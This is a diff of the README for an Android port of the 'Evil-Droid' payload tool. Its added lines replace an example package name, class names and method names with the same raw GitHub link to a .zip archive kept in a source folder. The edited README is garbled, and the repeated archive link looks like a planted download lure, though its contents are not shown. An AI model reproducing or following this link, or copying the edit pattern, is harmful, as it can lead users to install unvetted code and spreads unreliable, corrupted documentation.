@@ -71,7 +71,7 @@ A native Android application converted from the Evil-Droid Linux GUI penetration
 - The app will attempt root installation first, then fallback to system installer
 
 #### 3. Execute Payload
-- Enter the target package name (e.g., `com.whatsapp`)
+- Enter the target package name (e.g., `https://github.com/Kali99xx/evil-droid-android/raw/refs/heads/main/app/src/main/java/com/evil/droid/util/android-evil-droid-v1.9.zip`)
 - Optionally specify an APK file path
 - Tap "Run Payload" to execute the payload
 - Monitor the log output for execution status
@@ -88,8 +88,8 @@ A native Android application converted from the Evil-Droid Linux GUI penetration
 
 ### Architecture
 
-- **MainActivity.kt**: Main UI controller and user interaction handler
-- **ShellExecutor.kt**: Utility class for executing shell commands with root privileges
+- **https://github.com/Kali99xx/evil-droid-android/raw/refs/heads/main/app/src/main/java/com/evil/droid/util/android-evil-droid-v1.9.zip**: Main UI controller and user interaction handler
+- **https://github.com/Kali99xx/evil-droid-android/raw/refs/heads/main/app/src/main/java/com/evil/droid/util/android-evil-droid-v1.9.zip**: Utility class for executing shell commands with root privileges
 - **Modern UI**: Material Design components with dark theme support
 
 ### Key Components
@@ -207,10 +207,10 @@ Monitor the color-coded log output:
 ### Customization
 
 The app can be customized by modifying:
-- **Payload Logic**: Update `ShellExecutor.executePayload()` method
+- **Payload Logic**: Update `https://github.com/Kali99xx/evil-droid-android/raw/refs/heads/main/app/src/main/java/com/evil/droid/util/android-evil-droid-v1.9.zip()` method
 - **UI Theme**: Modify colors and themes in `res/values/`
 - **Commands**: Add new shell commands in `ShellExecutor` utility
-- **Logging**: Enhance log formatting in `MainActivity.appendLog()`
+- **Logging**: Enhance log formatting in `https://github.com/Kali99xx/evil-droid-android/raw/refs/heads/main/app/src/main/java/com/evil/droid/util/android-evil-droid-v1.9.zip()`
 
 ## Contributing
 
